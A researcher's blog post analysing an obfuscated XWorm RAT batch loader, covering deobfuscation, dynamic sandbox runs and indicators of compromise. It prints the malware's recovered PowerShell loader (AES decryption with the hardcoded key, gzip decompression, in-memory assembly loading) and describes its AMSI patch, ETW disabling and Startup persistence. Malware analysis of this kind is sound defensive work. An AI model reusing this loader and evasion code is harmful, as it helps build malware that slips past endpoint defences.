---
title: XWorm
date: 2025-04-21
draft: false
author: Kyd1ct
description: A static and dynamic analysis of a RAT.
---


In this article, weâ€™ll break down how this version of XWorm works, including:

- Deobfuscation: Attempt to deobfuscate the batch script. 

- Capabilities: Identify what the script does and how it achieves it.


## Discovery
The malicious script was obtained through the popular threat hunting community [AbuseCH](https://abuse.ch/) and their malware sample sharing platform [Malware Bazaar](https://bazaar.abuse.ch/). Credit to [smica83](https://bazaar.abuse.ch/user/5160/) for sharing the sample.

![Initial Discovery](/img/Malware/Xworm/initialDiscovery.jpg)


I first checked the website in [VirusTotal](https://www.virustotal.com/gui/file/e5269c1e1058ff5344999040ab4d02ad3cc2cb1020a2e1d9de9c62fed5e9123f)  and saw that the script was marked as malicious by multiple vendors. The first submisison occurred on the 18th of April, 2025, which indicated a new version of the RAT. The sample was also known as `04cb.bat` and `fwgwng.bat`.


## Analysis
### Static Analysis

When I opened the batch script I noticed that it was heavily obfuscated. At first I was confused but then I noticed a pattern - there were random strings encased with `%` and in-between them there were single characters that made up actual strings. After further research I found an article from [Huntress](https://www.huntress.com/blog/tried-and-true-hacker-technique-dos-obfuscation) - this is a common obfuscation technique used by attacks for batch scripts called **DOS Obfuscation**.

I decided to dump the contents of the batch script within CyberChef and I used RegEx to deobfuscate the script. I first tested the regular expression (`%[a-zA-Z0-9]+([^\s%])[a-zA-Z0-9]+%`), then removed the DOS Obfuscation:

![RegEx Test](/img/Malware/Xworm/regex_test.png)

![DOS Obfuscation Cleanup](/img/Malware/Xworm/initial_cleanup.png)

Afterwards I removed the long variable and replaced it with `set` (Refer to the image within the Discovery section.)

![Replacing the long variable.](/img/Malware/Xworm/second_cleanup.png)

After the inital cleanup, the batch script contained some identifiable commands, a long string that appeared to be commented out (`::`), a base64 string, and a lot of variables that contained chunks of clear and base64 encoded text in random order.

Starting off with the identifiable commands, we can see the following:

![Beginning of script.](/img/Malware/Xworm/start.jpg)

The script first disables command echoing and launched the commandline in a minimized window, specifying the full path of the script (drive, path, name, extension - `%~dpnx0`). It then exits the initial script and continues only with the new, minimized instance. Afterwards, a sourceFile variable is set, assigning the current pathdrive, path, name, and extension of the script. 

The next command (`copy "" "\dwm.bat" >nul"`) appears to be malformed. It is possible that this was done with the intention to confuse the analyst. The copy command requires both source and destination, in this case the source being an empty string. This invalidates the command. The output is also suppressed with `>nul`. Finally, the script enables delayed variable exansion ([`setlocal enabledelayedexpansion`](https://ss64.com/nt/delayedexpansion.html)) - this will allow the variables within the batch script to change throughout the execution and are not fixed at parse time.

Afterwards, the script assigns Base64 chunks to randomly named variables in a randomised order. This will be skipped for now.

A long comment follows the first few random variables, but I was unable to decode/decrypt it. It is possible that the complete base64 string from the variables may have hints regarding this so this will be revisited afterwards.

![Unknown comment string.](/img/Malware/Xworm/unknownString.jpg)

A lot more randomised variables follow before we reach a line that looks like this:

![Base64 label.](/img/Malware/Xworm/base64String.jpg)

This is clearly a Base64 string which we can decode. Before we do this, however, we can see something interesting - the use of `:::`. What would that do? In Batch scripts `:` is a lable and `::` is a comment. Triple colon does not exist in Batch so this is most likely a lable with the Base64 string as a comment. It is possible that the reconstructed command from the random variables could lead to this comment and extract the command. 

The Base64 command has a script that defines a main function (`Start-GenProcess`) which takes two optional parameters `$EnableVerbose` and `$DisableService`. The script assigns commands to variables. They are encoded to bypass detection. The entire script was obfuscated as a whole, using variables to concatenate strings and bypass detection/make analysis slower.

![Hex Encoding.](/img/Malware/Xworm/hexEncoding.jpg)

As a whole, the script can do the following:
- Retrieve address of `GetProcAddress`, `GetModuleHandle` from user32.dll
- Retrieve address of AmsiInitialize function in amsi.dll
- Initialise Amsi and modify memory protection - `0xb8,0x0,0x00,0x00,0x00,0xC3` - `mov eax, 0; ret`

Similar [versions](https://fluidattacks.com/blog/amsi-bypass/) of this specific assemby have been used to bypass Amsi. In this case it is passing `0x0`, which is a [standardised error code](https://learn.microsoft.com/en-us/windows/win32/learnwin32/error-handling-in-com) (`S_OK`) in COM.

The script also disables `EtwEventWrite`. Combining this with the `VirtualProtect` and the previously mentioned capabilities, it allows the script to patch system files while evading security mechanisms and disabling logging. Finally it checks if the `$DisableService` flag is set, indicating that service manipulation was successful.

![End of script.](/img/Malware/Xworm/disableSrv.jpg)

I tried to re-arrange the variables in the "correct order" but to no avail. The strings assigned to each variables appeared illegible even when decoded with Base64, though it may be because the string should be in correct order. I noticed that `anRy` was repeated a lot throughout the assigned strings to the variables. Decoding this from Base64 showed `jtr` as a result. That did not look like an actual command or human-readable words so it was either a part of another variable, or another obfuscation technique as initially thought.

I looked through the script again and decided to run it but partially. Running the script with multiple `echo` commands did not help so I decided to comment out some parts of the script - the first four lines. Those lines were used to prevent the script from echoing and then moved the script to a file called `dmw.bat`. I thought - running the script without it being able to access `dmw.bat` should result in an error.

![Meme.](/img/Malware/Xworm/batchMeme.jpg)

And I was right, the script did throw an error. The problem is that it had appropriate error handling and immediately killed the command line window the moment it did not find `dmw.bat`. I bypassed this by piping the output to a text file and bingo:

![Command Error.](/img/Malware/Xworm/errorCommand.jpg)

This shows us that Base64 (with a UTF8 character set) was indeed being used to decode the payload. After decoding it, I saw that the command was filled with the string `jtr` placed at random - my initial assessment was correct. 

![Command Decode.](/img/Malware/Xworm/commandDecode1.jpg)

A quick Find/Replace aaaaand... Done!

![Command Deobfuscate.](/img/Malware/Xworm/deobfCommand1.jpg)

Now we have the command and we can also see that parts of the payload were encrypted using AES. Thankfully, the script gives us all details required to decrypt the payload.

![Clear Command.](/img/Malware/Xworm/beautifyCommand.jpg)

We can immediately see that we have two main variables in the script:
- $yhuvl - at the very start.
- $ummwm - in the end of the command.
The former contains the script nestled between `@''@` - this is called a "[Here-String](https://devblogs.microsoft.com/scripting/maximizing-the-power-of-here-string-in-powershell-for-configuration-data/)". Why is it useful in obfuscating malware - it allows someone to define a multi-line string that can include special characters, quotes, permits code-like formatting and does not require escape characters. The lack of escape quotes or other special characters outside of the "Here-String" makes AVs think that this is just one long string, not a script. It would be identical to writing `Invoke-Expression $yhuvl` but it avoids escaping and looks less suspicious.

Afterwards the value of the former variable is assigned to the latter (most likely another technique to evade detection) and invokes it. We then see the AES decryption function of the script. As previously mentioned, the key and IV are hardcoded so it will be easy to decrypt the payload:

```powershell
function sguqwhqqiwyksbn($param_var){
		$aes_var=[System.Security.Cryptography.Aes]::Create();
		$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;
		$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
		$aes_var.Key=[System.Convert]::FromBase64String('FmdNQA2gks1mlrKyKNSR0vv38TV6cw7qFyWAQeTTMSY = ');
		$aes_var.IV=[System.Convert]::FromBase64String('SktSlarHcY7FWT3eTic31Q == ');
		$decryptor_var=$aes_var.CreateDecryptor();
		$return_var=$decryptor_var.TransformFinalBlock($param_var, 0, $param_var.Length);
		$decryptor_var.Dispose();
		$aes_var.Dispose();
		$return_var;
	}
```

The decrypted payload is then decompresses using gzip and loads .Net assembly to avoid writing on disk. The malware author also used reversed strings as another precaution to evade detection.
```powershell
# Gzip decompression
	function ecfuupouswjeayd($param_var){
		$xmssvjjburmpipk=New-Object System.IO.MemoryStream(,$param_var);
		$yjlnnvyqememctm=New-Object System.IO.MemoryStream;
		$cqsezlszfevbldh=New-Object System.IO.Compression.GZipStream($xmssvjjburmpipk, [IO.Compression.CompressionMode]::Decompress);
		$cqsezlszfevbldh.CopyTo($yjlnnvyqememctm);
		$cqsezlszfevbldh.Dispose();
		$xmssvjjburmpipk.Dispose();
		$yjlnnvyqememctm.Dispose();
		$yjlnnvyqememctm.ToArray();
	}
	# Extracts payload from dwm.bat
	function dgqmijcnbsydkyc($param_var,$param2_var){
		# 'daoL'[-1..-4] -join '' - obfuscation ("Load" reversed string)
		#Loads .Net assembly directory instead of writing to disk to evade detection
		$afeiyatmkhywofr=[System.Reflection.Assembly]::('daoL'[-1..-4] -join '')([byte[]]$param_var);
		$xhhiowwdqygjfjs=$afeiyatmkhywofr.EntryPoint;
		$xhhiowwdqygjfjs.Invoke($null, $param2_var);
	}
	# 'txeTllAdaeR'[-1..-11] -join '' - ReadAllText
	$host.UI.RawUI.WindowTitle = $hndfnypzcuzbtdz;$vsecrjyejquoiiz=[System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')($hndfnypzcuzbtdz).Split([Environment]::NewLine);
	# Looks for a string that starts with :: - the main payload of the malware.
	foreach ($jhqdscvgswaaotm in $vsecrjyejquoiiz) {
		if ($jhqdscvgswaaotm.StartsWith(':: '))	{
			$tyagyvqhchjjupt=$jhqdscvgswaaotm.Substring(3);
			break;
		}
    }
```

To summarise, the script grabs the payload (largest string that starts with `::` as mentioned earlier), decodes with from Base64, then decrypts it using AES and the provided key (`FmdNQA2gks1mlrKyKNSR0vv38TV6cw7qFyWAQeTTMSY = `) and IV (`SktSlarHcY7FWT3eTic31Q == `) and uses gunzip to decompress it. The key and IV are not legible even after being decoded with Base64, most likely to confuse researchers.

I used a recipe in CyberChef and successfully identified that this is a Gunzip file thanks to the magic number - `1f 8b 08` 

![Gzip Signature.](/img/Malware/Xworm/gzipSignature.jpg)

CyberChef could not decompress the gunzip file as it showed an invalid file signature error. With the help of ChatGPT, I wrote a script that decompressed it (and bypassed version dependencies as my Powershell version on the VM is 5.1) and extracted the executable.

![Extracted PE.](/img/Malware/Xworm/extractPayload.jpg)

I used Floss on the payload to get an idea of its capabilities. It showed that the original name of the file is `ijmnanslmt.tmp`. Another hint that's listed is `mscoree.dll` - dynamic link library that loads .NET assembly in memory. This is most often seen in fileless malware and [LOLBAS](https://lolbas-project.github.io/#). It is also capable of running with the same permissions as the invoker.

![Extracted Strings.](/img/Malware/Xworm/payloadFloss.jpg)

### Dynamic Analysis

I first attempted to execute the extracted PE, but it did not do much by itself. I did not observe any created files or connections. This is why I decided to revert to my previous snapshot and run the main batch file.

The script generated a lot of processes but most of them did spark any curiousity. One chunk, however, revealed the malware's persistence - it copied itself into the StartUp directory using a randomised name. 

![Persistence.](/img/Malware/Xworm/persistenceFile.jpg)

I wondered why it did not show any other activity so I decided to check the PowerShell Transcription logs. It appeared that the script's execution was terminated midway as it could not find a service provider. It is possible that it detected Internet Service simulation suite (`inetsim`) that I normally use when analysing malware:

![Terminated.](/img/Malware/Xworm/executionTermination.jpg)

###  Conclusion
To summarise, this batch file was heavily obfuscated. It has the capabilities to tamper with AMSI, disable logging, and load malicious payloads into memory. While the sample did pose a challenge, I was able to learn a lot of new techniques that will help me analyse and deobfuscate other samples in the future much more easily.

## IoCs  

### Hashes
Batch File
- MD5: 258e7f6f287106dda8c97422a776e823
- SHA256: e5269c1e1058ff5344999040ab4d02ad3cc2cb1020a2e1d9de9c62fed5e9123f 
- 45.88.186[.]43

PE Payload
- MD5: 6b18a0941cbfcbad0018988908fd1fbc
- SHA256: 9654c5497a6493585a1ff70a3d94d059c24e0403868b63a1cff80acc4cc3fcf9
